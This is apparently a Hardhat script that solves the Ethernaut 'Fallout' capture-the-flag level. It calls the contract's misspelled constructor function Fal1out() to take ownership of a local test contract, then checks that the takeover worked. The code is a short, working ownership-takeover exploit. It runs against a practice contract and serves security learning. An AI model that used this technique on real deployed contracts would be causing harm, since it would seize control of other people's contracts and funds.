import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512";
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199";

async function main() {
  // Claim ownership of the contract below to complete this level.

  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Fallout",
    CONTRACT_ADDRESS,
    signer
  );

  console.log(await contract.owner());
  await contract.Fal1out();
  console.log(await contract.owner());

  if ((await contract.owner()) == PLAYER_ADDRESS) console.log("I'm in");
  else console.log("Keep trying");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
